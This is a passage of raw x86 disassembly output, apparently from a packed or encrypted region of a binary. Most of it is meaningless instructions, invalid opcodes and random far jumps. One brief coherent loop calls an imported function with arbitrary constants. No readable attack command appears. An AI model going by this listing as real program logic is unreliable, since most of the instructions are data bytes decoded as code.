  4047d8:	hlt    
  4047d9:	jl     0x4047e3
  4047db:	xlat   BYTE PTR ds:[ebx]
  4047dc:	jle    0x404830
  4047de:	jl     0x404790
  4047e0:	ins    DWORD PTR es:[edi],dx
  4047e1:	mov    edx,0xf13c1319
  4047e6:	inc    ebx
  4047e7:	pop    es
  4047e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047e9:	loope  0x404835
  4047eb:	pop    edx
  4047ec:	data16 xchg bp,ax
  4047ef:	sbb    al,0x55
  4047f1:	mov    ebp,0xd0880be0
  4047f6:	das    
  4047f7:	aad    0xfb
  4047f9:	pop    ebp
  4047fa:	xor    ah,BYTE PTR [ebp-0x6ad1df9e]
  404800:	leave  
  404801:	outs   dx,BYTE PTR ds:[esi]
  404802:	mov    edi,0x1e1451f1
  404807:	lods   eax,DWORD PTR ds:[esi]
  404808:	test   DWORD PTR ds:0xfe8d62e,ebx
  40480e:	aam    0xe7
  404810:	cmp    edi,DWORD PTR [esp+ebp*2+0x3efb8506]
  404817:	cld    
  404818:	inc    edi
  404819:	cdq    
  40481a:	xor    edi,DWORD PTR [ebp+0x3c]
  40481d:	stos   BYTE PTR es:[edi],al
  40481e:	add    al,0xf7
  404820:	xor    eax,0x84a97ae1
  404825:	pop    ecx
  404826:	fst    QWORD PTR [ecx+0x25]
  404829:	je     0x4047c8
  40482b:	sub    DWORD PTR [esi+0x4345245f],esi
  404831:	fsubr  QWORD PTR [edi+esi*1]
  404834:	icebp  
  404835:	or     al,0x55
  404837:	retf   
  404838:	in     al,dx
  404839:	mov    eax,0x3ea35f0b
  40483e:	cmp    al,0x91
  404840:	or     BYTE PTR [ebp+edx*2+0x7579a22b],dl
  404847:	or     al,BYTE PTR [eax*1+0x3faa5c15]
  40484e:	xchg   ebx,eax
  40484f:	inc    esi
  404850:	fcmovne st,st(1)
  404852:	aam    0x6a
  404854:	mov    esi,0xd60ed171
  404859:	xor    BYTE PTR [ecx+0x67],0x6b
  40485d:	aam    0x49
  40485f:	or     bh,BYTE PTR [esi-0xa]
  404862:	cdq    
  404863:	xchg   esi,eax
  404864:	outs   dx,BYTE PTR ds:[esi]
  404865:	imul   eax,ebp,0xffffffce
  404868:	pop    es
  404869:	dec    edx
  40486a:	mov    ecx,0x74f18247
  40486f:	xor    DWORD PTR [bp+di+0x3898],edx
  404874:	mov    DWORD PTR [edi],edi
  404876:	xor    al,0x30
  404878:	lock ret 
  40487a:	sub    dh,BYTE PTR [edx-0x25d33ec7]
  404880:	fcomp  DWORD PTR [ebx-0x4a]
  404883:	xchg   BYTE PTR [esi],dl
  404885:	or     BYTE PTR [ebp+0x6f9292f6],0xcb
  40488c:	int3   
  40488d:	loope  0x4048a5
  40488f:	adc    al,0x20
  404891:	call   0x750b:0xfd9d7c2c
  404898:	cmp    al,bh
  40489a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40489b:	fist   WORD PTR [ebx-0x43]
  40489e:	mov    DWORD PTR [ecx+esi*4],eax
  4048a1:	fldenv [esi]
  4048a3:	inc    edx
  4048a4:	jne    0x404858
  4048a6:	xor    DWORD PTR [ecx+0x69e0ba3b],0x5c
  4048ad:	shl    DWORD PTR [esi+0x57967f83],cl
  4048b3:	or     eax,0xb68128b0
  4048b8:	(bad)  
  4048b9:	icebp  
  4048ba:	cs push esi
  4048bc:	mov    ch,0x88
  4048be:	cli    
  4048bf:	fisub  WORD PTR [ebx+0x59]
  4048c2:	mov    ds:0xd20840a1,al
  4048c7:	add    al,0x7f
  4048c9:	add    edx,edx
  4048cb:	mov    al,ds:0xea10cf39
  4048d0:	adc    ebx,DWORD PTR [eax]
  4048d2:	in     al,0xa7
  4048d4:	sub    BYTE PTR [edx-0xe],cl
  4048d7:	out    dx,eax
  4048d8:	push   0x1d6ed50c
  4048dd:	pop    ds
  4048de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048df:	sub    cl,BYTE PTR [eax+0x23]
  4048e2:	adc    ecx,DWORD PTR [esp+edx*8-0x56]
  4048e6:	dec    esp
  4048e7:	and    eax,0x4cfd5b51
  4048ec:	dec    ecx
  4048ed:	xor    eax,0xbc43bab0
  4048f2:	pop    ebx
  4048f3:	jo     0x40490a
  4048f5:	in     eax,0xd3
  4048f7:	repz in eax,0x8a
  4048fa:	je     0x404965
  4048fc:	imul   ebp,esp,0xffffffc8
  4048ff:	imul   ecx,DWORD PTR [eax+0x2c],0x782477bd
  404906:	xchg   ebp,eax
  404907:	rcl    DWORD PTR [edx+0x15],1
  40490a:	(bad)  
  40490b:	or     al,0xb1
  40490d:	sbb    bl,ah
  40490f:	sahf   
  404910:	jns    0x404915
  404912:	sub    DWORD PTR [ecx-0x49],esi
  404915:	sub    al,bh
  404917:	pop    edx
  404918:	enter  0x378e,0x2e
  40491c:	sub    DWORD PTR [eax],0x44
  40491f:	cmp    ecx,eax
  404921:	adc    edi,eax
  404923:	je     0x404902
  404925:	jecxz  0x40491f
  404927:	and    al,0xaf
  404929:	jmp    0x404968
  40492b:	adc    eax,0x1e9f1ff4
  404930:	aam    0xa3
  404932:	outs   dx,DWORD PTR ds:[esi]
  404933:	jbe    0x404996
  404935:	jecxz  0x404937
  404937:	std    
  404938:	and    al,0xf7
  40493a:	clc    
  40493b:	pop    DWORD PTR [ebp-0x57]
  40493e:	ffree  st(1)
  404940:	mov    al,0x87
  404942:	jb     0x4049b5
  404944:	out    0x20,eax
  404946:	int    0x48
  404948:	jmp    0xbdec5f0c
  40494d:	ret    0xcf70
  404950:	in     eax,0x44
  404952:	jae    0x40493b
  404954:	jg     0x404932
  404956:	fdecstp 
  404958:	dec    eax
  404959:	lock sbb edx,DWORD PTR [ecx+0x9ca398c]
  404960:	fidivr WORD PTR [edx+0x6b434dde]
  404966:	outs   dx,BYTE PTR ds:[esi]
  404967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404968:	jecxz  0x404938
  40496a:	cmc    
  40496b:	enter  0x7762,0x45
  40496f:	test   BYTE PTR [ecx],cl
  404971:	lods   eax,DWORD PTR ds:[esi]
  404972:	adc    ah,0xfb
  404975:	inc    ebp
  404976:	div    ah
  404978:	aas    
  404979:	fisub  DWORD PTR [esi]
  40497b:	das    
  40497c:	lock aaa 
  40497e:	and    edx,ecx
  404980:	cdq    
  404981:	jmp    0x4049d6
  404983:	jl     0x4049d3
  404985:	in     eax,dx
  404986:	repz adc ecx,edi
  404989:	xor    dh,BYTE PTR [esi-0x6c]
  40498c:	xchg   esp,eax
  40498d:	outs   dx,DWORD PTR ds:[esi]
  40498e:	inc    eax
  40498f:	not    DWORD PTR [edx+0x33]
  404992:	mov    ah,BYTE PTR [esp+edx*1+0x24495ae7]
  404999:	mov    dh,0x67
  40499b:	das    
  40499c:	lahf   
  40499d:	jecxz  0x404970
  40499f:	pop    edx
  4049a0:	sbb    eax,0x9a676801
  4049a5:	xor    al,0x8f
  4049a7:	inc    esi
  4049a8:	sub    BYTE PTR [edx-0x37b582b1],al
  4049ae:	push   eax
  4049af:	mov    bh,0xee
  4049b1:	out    dx,al
  4049b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049b3:	pop    ss
  4049b4:	das    
  4049b5:	push   0x8b53d8d5
  4049ba:	and    DWORD PTR [edx+0x61],edx
  4049bd:	pop    ecx
  4049be:	xchg   DWORD PTR [eax-0x795a99e1],esp
  4049c4:	ins    BYTE PTR es:[edi],dx
  4049c5:	fcom   DWORD PTR [ebp+0xe7ae7b1]
  4049cb:	mov    al,0x80
  4049cd:	jae    0x404a25
  4049cf:	jge    0x40499b
  4049d1:	inc    eax
  4049d2:	jns    0x404975
  4049d4:	push   0xeb83fb85
  4049d9:	arpl   bx,bx
  4049db:	xchg   edi,eax
  4049dc:	lods   eax,DWORD PTR ds:[esi]
  4049dd:	les    edi,FWORD PTR [edx+0x294b3207]
  4049e3:	shl    esp,cl
  4049e5:	mov    bl,0xdc
  4049e7:	stos   BYTE PTR es:[edi],al
  4049e8:	(bad)  
  4049e9:	mov    ch,0x8e
  4049eb:	ds ds cmp cl,dh
  4049ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049f0:	mov    DWORD PTR [eax-0x3b54aa1f],ecx
  4049f6:	imul   DWORD PTR [ebp+0x3a2f6dab]
  4049fc:	std    
  4049fd:	jp     0x404a51
  4049ff:	sub    BYTE PTR [edx+0x4e97dd04],bl
  404a05:	fstp   DWORD PTR [ebx+0x4494196e]
  404a0b:	cmp    DWORD PTR [esi],ebx
  404a0d:	push   ecx
  404a0e:	cmp    dl,BYTE PTR [esi+ebx*2+0x739a832a]
  404a15:	iret   
  404a16:	jbe    0x404a87
  404a18:	stos   BYTE PTR es:[edi],al
  404a19:	imul   eax,DWORD PTR [edi],0x19
  404a1c:	test   BYTE PTR [ebp+0x36146344],ch
  404a22:	cmc    
  404a23:	pop    eax
  404a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a25:	aaa    
  404a26:	lds    ecx,FWORD PTR [ecx*2-0x4c79c5e6]
  404a2d:	sbb    eax,0x6a3a85d8
  404a32:	sub    al,0x5c
  404a34:	imul   eax,ecx,0x1d
  404a37:	stc    
  404a38:	dec    ecx
  404a39:	mov    eax,ds:0x27b599b
  404a3e:	fcomp  DWORD PTR [ebp+0xc3c9e37]
  404a44:	(bad)  
  404a45:	mov    ds:0x6178f136,eax
  404a4a:	sbb    esi,DWORD PTR [edi-0x75]
  404a4d:	mov    ecx,0x7510850
  404a52:	and    DWORD PTR ds:0x42a839,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a839
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a839,esi
  404a69:	cmp    DWORD PTR ds:0x42a839,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a839,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a839
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a839,esi
  404ab7:	cmp    DWORD PTR ds:0x42a839,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a7fd
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	rol    DWORD PTR [eax+0x2e464696],0x78
  404ae9:	js     0x404b38
  404aeb:	jle    0x404b65
  404aed:	js     0x404af5
  404aef:	js     0x404b3d
  404af1:	in     al,0xdb
  404af3:	push   eax
  404af4:	(bad)  
  404af6:	or     BYTE PTR [ebx-0x6e],bl
  404af9:	shl    DWORD PTR [ebx-0x658e3a0b],cl
  404aff:	and    DWORD PTR gs:0xb47e06e5,ebp
  404b06:	mov    ebp,0xee6b5beb
  404b0b:	push   edx
  404b0c:	les    ecx,FWORD PTR [ebx+0x25650d25]
  404b12:	hlt    
  404b13:	mov    esi,0xbf8d0a77
  404b18:	imul   esp,DWORD PTR [edi],0x950031c0
  404b1e:	sbb    cl,BYTE PTR [edi+0x5806d2fc]
  404b24:	push   ds
  404b25:	push   0xcad46482
  404b2a:	jp     0x404ac2
  404b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b2d:	jmp    0x1224:0xe604ef06
  404b34:	cwde   
  404b35:	jne    0x404ae4
  404b37:	call   0x3427:0xe3507f70
  404b3e:	jmp    0x404ba3
  404b40:	test   al,0x5e
  404b42:	lods   al,BYTE PTR ds:[esi]
  404b43:	adc    dl,BYTE PTR [ebx+0x15]
  404b46:	mov    ebx,0x3cd643c7
  404b4b:	jns    0x404ad0
  404b4d:	je     0x404b75
  404b4f:	push   ebx
  404b50:	add    al,0x76
  404b52:	push   edx
  404b53:	sbb    BYTE PTR [edx+0x28],0x8
  404b57:	lahf   
  404b58:	fs sbb eax,0x2ded4ebe
  404b5e:	mov    ebp,0x5aab1d59
  404b63:	iret   
  404b64:	mov    bl,0x2f
  404b66:	sub    BYTE PTR [ebx],0xe
  404b69:	pop    ds
  404b6a:	icebp  
  404b6b:	push   edi
  404b6c:	into   
  404b6d:	(bad)  
  404b6e:	mov    edi,0x2c8798ac
  404b73:	push   esp
  404b74:	adc    bh,BYTE PTR [esi-0x7580d342]
  404b7a:	inc    ecx
  404b7b:	(bad)  
  404b7c:	lock inc edi
  404b7e:	nop
  404b7f:	int3   
  404b80:	push   ebp
  404b81:	dec    edi
  404b82:	stos   BYTE PTR es:[edi],al
  404b83:	and    BYTE PTR [ebx+ecx*1+0x77fd547e],bl
  404b8a:	xor    DWORD PTR [ecx+0x628fe6ce],ebx
  404b90:	frstor [eax+0x48]
  404b93:	mov    edx,0x9e6cd2f1
  404b98:	mov    ebp,0x715dbc37
  404b9d:	rol    BYTE PTR [esi],cl
  404b9f:	add    DWORD PTR cs:[ecx+edi*2+0x4f79838f],edi
  404ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ba8:	dec    esp
  404ba9:	add    BYTE PTR [ecx],cl
  404bab:	jmp    0x404c0a
  404bad:	cmp    al,0xec
  404baf:	(bad)  
  404bb0:	in     al,dx
  404bb1:	push   edx
  404bb2:	mov    edx,cs
  404bb4:	(bad)  
  404bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bb6:	fimul  DWORD PTR [esi+0x35fcca27]
  404bbc:	xchg   ebx,eax
  404bbd:	iret   
  404bbe:	ffree  st(6)
  404bc0:	daa    
  404bc1:	rcl    BYTE PTR [ebp+edx*1-0x2],cl
  404bc5:	nop
  404bc6:	push   ds
  404bc7:	gs test eax,0x3e4ee695
  404bce:	repnz in eax,dx
  404bd0:	mov    bl,BYTE PTR [edx-0x67]
  404bd3:	(bad)  
  404bd4:	fnstcw WORD PTR [eax-0x7e969fc2]
  404bda:	data16 loope 0x404b9d
  404bdd:	shl    DWORD PTR [esi-0x2f53fac9],cl
  404be3:	and    al,0x8f
  404be5:	mov    dh,0x2b
  404be7:	cs jae 0x404c68
  404bea:	jno    0x404bde
  404bec:	lock mov fs,WORD PTR ds:0x262bd9e2
  404bf3:	dec    ebx
  404bf4:	leave  
  404bf5:	sti    
  404bf6:	repz inc eax
  404bf8:	xchg   esp,eax
  404bf9:	daa    
  404bfa:	add    dl,BYTE PTR ds:0x3b755d0c
  404c00:	lds    ebx,FWORD PTR [ecx+0x4f]
  404c03:	adc    eax,0xed63fc4e
  404c08:	rcr    DWORD PTR [eax],0x42
  404c0b:	mov    ds:0x18da0a55,al
  404c10:	aas    
  404c11:	mov    esp,0x6d2e67c0
  404c16:	jmp    0x57dede22
  404c1b:	xor    edx,DWORD PTR [esp+eiz*8+0xec7c817]
  404c22:	pop    edx
  404c23:	lock mov ebp,0xe6a35a21
  404c29:	xor    al,0xf
  404c2b:	mov    edx,esp
  404c2d:	jmp    0x404c06
  404c2f:	in     al,dx
  404c30:	es call 0x1430:0x6a180b2
  404c38:	xor    ebx,DWORD PTR [ebp-0x60]
  404c3b:	cld    
  404c3c:	dec    edx
  404c3d:	adc    al,0x3a
  404c3f:	jg     0x404c0e
  404c41:	dec    ecx
  404c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c43:	mov    bh,ah
  404c45:	rcl    DWORD PTR [edi],1
  404c47:	mov    dh,0xd
  404c49:	mov    BYTE PTR [esi+0x7],ch
  404c4c:	mov    bl,0xb3
  404c4e:	pop    edi
  404c4f:	repnz pop ebx
  404c51:	and    eax,0x9492b784
  404c56:	gs nop
  404c58:	dec    DWORD PTR [edi+eax*2-0xc35a04d]
  404c5f:	repnz dec esi
  404c61:	(bad)  
  404c62:	or     al,0xfe
  404c64:	mov    esp,0xb37960db
  404c69:	outs   dx,DWORD PTR ds:[esi]
  404c6a:	sub    bl,BYTE PTR [edx+0x25]
  404c6d:	push   0x62279196
  404c72:	push   ebx
  404c73:	icebp  
  404c74:	jmp    0xb749:0x3af15172
  404c7b:	mov    fs,WORD PTR [esi-0x5e]
  404c7e:	sar    DWORD PTR [ebx-0x468ad960],cl
  404c84:	addr16 out dx,al
  404c86:	jp     0x404c1b
  404c88:	xor    bh,dl
  404c8a:	loop   0x404c16
  404c8c:	fwait
  404c8d:	pushf  
  404c8e:	cmc    
  404c8f:	sar    BYTE PTR [esi-0x7e],cl
  404c92:	and    dl,BYTE PTR [ecx+0x53]
  404c95:	inc    ecx
  404c96:	test   eax,0xb523f13d
  404c9b:	inc    eax
  404c9c:	imul   ebx,DWORD PTR [edx],0xdfec17b7
  404ca2:	out    0xcb,eax
  404ca4:	mov    edi,0xe1af964b
  404ca9:	imul   edx,DWORD PTR [ecx+0x6df824f5],0xfffffff1
  404cb0:	pushf  
  404cb1:	in     al,dx
  404cb2:	xchg   esi,eax
  404cb3:	retf   
  404cb4:	data16 mov ah,0xcd
  404cb7:	stc    
  404cb8:	(bad)  
  404cb9:	loop   0x404ca7
  404cbb:	push   esi
  404cbc:	mul    DWORD PTR [ebp-0x1dfbe31f]
  404cc2:	sti    
  404cc3:	js     0x404ca7
  404cc5:	rcr    BYTE PTR ds:0x460ab546,1
  404ccb:	inc    esi
  404ccc:	hlt    
  404ccd:	inc    esi
  404cce:	jnp    0x404cac
  404cd0:	or     esi,ecx
  404cd2:	dec    esi
  404cd3:	push   edi
  404cd4:	push   ebp
  404cd5:	mov    ds:0x2fdb089a,eax
  404cda:	and    DWORD PTR [esi],ebx
  404cdc:	test   ch,0x64
  404cdf:	pop    edi
  404ce0:	ret    0x4bca
  404ce3:	and    al,0x88
  404ce5:	lods   al,BYTE PTR ds:[esi]
  404ce6:	repz push ss
  404ce8:	cli    
  404ce9:	and    BYTE PTR [edx-0x4c653363],dl
  404cef:	jl     0x404d63
  404cf1:	popf   
  404cf2:	loopne 0x404cad
  404cf4:	(bad)  
  404cf5:	xor    DWORD PTR [ecx+0x257ad7c],ecx
  404cfb:	xlat   BYTE PTR ds:[ebx]
  404cfc:	ins    BYTE PTR es:[edi],dx
  404cfd:	inc    ebx
  404cfe:	pop    edi
  404cff:	dec    esi
  404d00:	imul   edx,eax,0x57e55913
  404d06:	daa    
  404d07:	sub    DWORD PTR [ecx-0x7d7e1beb],esp
  404d0d:	lea    ecx,[edi-0x3d2bc7af]
  404d13:	cli    
  404d14:	out    dx,eax
  404d15:	dec    eax
  404d16:	inc    esi
  404d17:	mov    bl,0x8b
  404d19:	inc    esp
  404d1a:	ss inc esi
  404d1d:	inc    ebp
  404d1e:	daa    
  404d1f:	pop    ss
  404d20:	mov    ebp,0x7cb7d3a0
  404d25:	mov    bh,0x74
  404d27:	dec    edx
  404d28:	xor    eax,0x83dca242
  404d2d:	sti    
  404d2e:	imul   eax,ecx,0xffffffe8
  404d31:	(bad)  
  404d32:	call   0xc9a0c632
  404d37:	gs hlt 
  404d39:	jo     0x404d4f
  404d3b:	sub    BYTE PTR [edi+eiz*2],cl
  404d3e:	jno    0x404d89
  404d40:	push   0xffffffb2
  404d42:	push   esp
  404d43:	dec    eax
  404d44:	leave  
  404d45:	das    
  404d46:	mov    ebx,DWORD PTR [edi-0x1e]
  404d49:	outs   dx,BYTE PTR ds:[esi]
  404d4a:	xlat   BYTE PTR ds:[ebx]
  404d4b:	mov    dl,BYTE PTR [esi-0x3a5d3543]
  404d51:	mov    al,ds:0x246cd5c7
  404d56:	push   ss
  404d57:	aam    0x9e
  404d59:	test   al,0xe6
  404d5b:	into   
  404d5c:	mov    edi,0x854eacba
  404d61:	cmp    eax,0x24537fdc
  404d66:	retf   0xd787
  404d69:	push   0x2a02dd45
  404d6e:	adc    eax,ebp
  404d70:	test   eax,0xbd231b73
  404d75:	or     BYTE PTR [edi+0x64445148],0x95
  404d7c:	fstp   DWORD PTR [edi]
  404d7e:	add    bh,BYTE PTR [ecx+0x7931c310]
  404d84:	mov    BYTE PTR [ebp+0x50],0x3a
  404d88:	sbb    ebp,DWORD PTR [esi-0x1f914c98]
  404d8e:	push   ds
  404d8f:	mov    dh,BYTE PTR [eax]
  404d91:	aaa    
  404d92:	xor    ebp,DWORD PTR [ebp+0x35]
  404d95:	mov    DWORD PTR ds:0xcd0f0d5a,esi
  404d9b:	mov    eax,ds:0x81268d7a
  404da0:	push   0xe0e8bbb
  404da5:	call   0x3c1f0440
  404daa:	pop    ss
  404dab:	inc    eax
  404dac:	aam    0xb
  404dae:	xor    al,0x22
  404db0:	rcr    BYTE PTR [edi+0x5550833b],cl
  404db6:	stos   BYTE PTR es:[edi],al
  404db7:	sahf   
  404db8:	(bad)  
  404db9:	enter  0x6246,0x12
  404dbd:	add    eax,0x57280aaf
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	mov    bl,0xb8
  404dea:	ror    DWORD PTR [ebp-0x65],1
  404ded:	xor    edi,DWORD PTR [eax+0x78]
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404dac
  404df5:	inc    esp
  404df6:	pop    edx
  404df7:	pop    edx
  404df8:	cs dec ecx
  404dfa:	or     bh,BYTE PTR [edx+edi*1+0x7ee18d81]
  404e01:	dec    edi
  404e02:	mov    eax,DWORD PTR [ecx-0x5e]
  404e05:	mov    ebx,edx
  404e07:	mov    cl,0xd
  404e09:	jnp    0x404e24
  404e0b:	dec    ecx
  404e0c:	pop    edi
  404e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e0e:	stos   BYTE PTR es:[edi],al
  404e0f:	inc    edx
  404e10:	jb     0x404de8
  404e12:	sbb    eax,0x364dcc28
  404e17:	push   ds
  404e18:	fs or  ch,al
  404e1b:	in     al,0xc6
  404e1d:	xchg   DWORD PTR [ecx],ebp
  404e1f:	add    eax,0x5535db42
  404e24:	push   cs
  404e25:	imul   ebx,DWORD PTR [ebp-0x9a07b5c],0x38
  404e2c:	stos   BYTE PTR es:[edi],al
  404e2d:	retf   
  404e2e:	pop    ss
  404e2f:	sbb    esp,ebp
  404e31:	popf   
  404e32:	ins    DWORD PTR es:[edi],dx
  404e33:	dec    ecx
  404e34:	xor    eax,0xab977c7a
  404e39:	mov    WORD PTR ss:[edx],gs
  404e3c:	loope  0x404dca
  404e3e:	xchg   ebx,eax
  404e3f:	and    edi,0xffffffab
  404e42:	xchg   esi,eax
  404e43:	jmp    0x5d5a:0x398fe8db
  404e4a:	std    
  404e4b:	xchg   edx,eax
  404e4c:	adc    eax,0x4a0437e5
  404e51:	mov    bl,0xd9
  404e53:	inc    BYTE PTR [esi+0x44]
  404e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e57:	push   edx
  404e58:	je     0x404e20
  404e5a:	rol    dl,cl
  404e5c:	lea    ebx,[ecx]
  404e5e:	and    eax,0x6f109fcb
  404e63:	je     0x404e10
  404e65:	pusha  
  404e66:	adc    al,cl
  404e68:	icebp  
  404e69:	push   edi
  404e6a:	jmp    0xcc83:0x9efa94b1
  404e71:	test   ah,cl
  404e73:	mov    ebx,0x488db083
  404e78:	pop    esi
  404e79:	cmp    al,0x60
  404e7b:	in     eax,dx
  404e7c:	mov    BYTE PTR [eax-0x43805513],dl
  404e82:	jg     0x404ea3
  404e84:	imul   edi,DWORD PTR [ebp-0x72b1e616],0xffffffbf
  404e8b:	pop    edx
  404e8c:	push   ss
  404e8d:	cli    
  404e8e:	frstor [esi+0x2b]
  404e91:	push   ebp
  404e92:	and    eax,0x1a24a469
  404e97:	stc    
  404e98:	inc    esi
  404e99:	mov    al,BYTE PTR [eax+ecx*4-0x341adc72]
  404ea0:	ja     0x404eca
  404ea2:	sti    
  404ea3:	pusha  
  404ea4:	mov    edx,0xdca54160
  404ea9:	fimul  WORD PTR [edx+0x5e81e8f5]
  404eaf:	ja     0x404eab
  404eb1:	and    al,BYTE PTR [edx+0x45]
  404eb4:	jbe    0x404e78
  404eb6:	(bad)  
  404eb7:	fdiv   st(6),st
  404eb9:	sahf   
  404eba:	adc    al,0xc3
  404ebc:	sbb    dl,BYTE PTR [ebx]
  404ebe:	add    BYTE PTR [edx+0x7e],cl
  404ec1:	mov    WORD PTR [ecx+0x6224a954],fs
  404ec7:	lods   al,BYTE PTR ds:[esi]
  404ec8:	mov    bh,0xfe
  404eca:	inc    ecx
  404ecb:	push   ecx
  404ecc:	mov    WORD PTR [esi+eiz*2-0x355f0ac0],fs
  404ed3:	dec    eax
  404ed4:	mov    edx,0x62439c06
  404ed9:	dec    ecx
  404eda:	push   ebx
  404edb:	cmp    esi,eax
  404edd:	mov    dh,0x95
  404edf:	into   
  404ee0:	cmp    edx,DWORD PTR [esi+0x27]
  404ee3:	call   0x8312:0x1cafd992
  404eea:	lea    edx,[edi]
  404eec:	lods   al,BYTE PTR ds:[esi]
  404eed:	iret   
  404eee:	pop    ss
  404eef:	sub    BYTE PTR [ecx+0x29acdc40],cl
  404ef5:	mov    esi,0x937513e
  404efa:	sub    BYTE PTR [ebp+ebx*1+0x18],ah
  404efe:	dec    eax
  404eff:	mov    ch,0x9
  404f01:	cmp    DWORD PTR [ebx+0x5],0xb8d81e81
  404f08:	fpatan 
  404f0a:	xchg   edi,eax
  404f0b:	sub    ch,BYTE PTR [ecx-0x4a079564]
  404f11:	in     al,dx
  404f12:	les    ecx,FWORD PTR [edi+esi*4]
  404f15:	cmp    al,0xa3
  404f17:	xor    eax,0x82e44bcb
  404f1c:	add    eax,eax
  404f1e:	or     DWORD PTR [esi+0x577f66d4],edx
  404f24:	pop    ds
  404f25:	cs jb  0x404eeb
  404f28:	jbe    0x404f54
  404f2a:	lds    edi,FWORD PTR [edx]
  404f2c:	dec    BYTE PTR [ecx-0x42]
  404f2f:	ret    0x7bdd
  404f32:	pop    ecx
  404f33:	aas    
  404f34:	pop    eax
  404f35:	sahf   
  404f36:	loope  0x404f9e
  404f38:	mov    ebx,0xd8129adb
  404f3d:	outs   dx,BYTE PTR ds:[esi]
  404f3e:	mov    ch,0x14
  404f40:	adc    al,0x21
  404f42:	clc    
  404f43:	mov    dh,0x13
  404f45:	loopne 0x404ee9
  404f47:	bound  eax,QWORD PTR [ecx+eiz*4+0x7ee4688d]
  404f4e:	xchg   ebx,eax
  404f4f:	pushf  
  404f50:	pusha  
  404f51:	(bad)  
  404f52:	adc    DWORD PTR [ecx],esp
  404f54:	dec    ebp
  404f55:	inc    edi
  404f56:	(bad)  
  404f58:	push   edx
  404f59:	mov    eax,?
  404f5b:	sub    DWORD PTR [ecx+eax*4-0x1],esi
  404f5f:	dec    edx
  404f60:	sub    ah,bh
  404f62:	(bad)  
  404f63:	(bad)  
  404f65:	add    DWORD PTR [edi],ebp
  404f67:	in     al,dx
  404f68:	mov    dl,0x3e
  404f6a:	popa   
  404f6b:	mov    al,ds:0x6b486675
  404f70:	lea    edx,[ebx+0x9debcff]
  404f76:	mov    dl,0xbd
  404f78:	sub    ch,BYTE PTR [edi]
  404f7a:	lods   eax,DWORD PTR ds:[esi]
  404f7b:	sub    BYTE PTR [ecx+ebx*8],dh
  404f7e:	rcl    BYTE PTR [edi],0x94
  404f81:	inc    edx
  404f82:	pop    ss
  404f83:	sar    al,0x80
  404f86:	add    eax,0xebeaebd1
  404f8b:	push   esi
  404f8c:	(bad)  
  404f8e:	lahf   
  404f8f:	int3   
  404f90:	jb     0x404f69
  404f92:	ja     0x404f50
  404f94:	outs   dx,DWORD PTR ds:[esi]
  404f95:	pop    ebx
  404f96:	ja     0x404f3f
  404f98:	pop    ebx
  404f99:	xchg   edi,eax
  404f9a:	sbb    eax,0x2feabf91
  404f9f:	sbb    eax,0x67831e64
  404fa4:	rol    BYTE PTR ds:0xf6c8fd9f,cl
  404faa:	add    DWORD PTR [esi],ebx
  404fac:	mov    al,ds:0x176f903a
  404fb1:	out    0xba,al
  404fb3:	push   eax
  404fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fb5:	stos   BYTE PTR es:[edi],al
  404fb6:	shl    BYTE PTR [eax-0x1f],0x70
  404fba:	sub    dh,0x7d
  404fbd:	fsub   QWORD PTR [eax+0x3e]
  404fc0:	and    DWORD PTR [ebx+0x56],esi
  404fc3:	push   eax
  404fc4:	or     al,0xee
  404fc6:	jl     0x404f57
  404fc8:	jns    0x404ff8
  404fca:	(bad)  
  404fcb:	and    al,0x1
  404fcd:	xor    dl,ch
  404fcf:	push   edx
  404fd0:	scas   eax,DWORD PTR es:[edi]
  404fd1:	ret    
  404fd2:	aaa    
  404fd3:	push   es
  404fd4:	icebp  
  404fd5:	mov    dl,0x44
  404fd7:	mov    dh,0xf0
  404fd9:	test   BYTE PTR [eax+0x19],cl
  404fdc:	inc    ebp
  404fdd:	je     0x404fd7
  404fdf:	std    
  404fe0:	or     bh,BYTE PTR [eax+0x3705642d]
  404fe6:	adc    edi,ecx
  404fe8:	les    ecx,FWORD PTR [ebx-0x3c8e2b92]
  404fee:	xchg   ebp,eax
  404fef:	mov    bl,0x66
  404ff1:	int3   
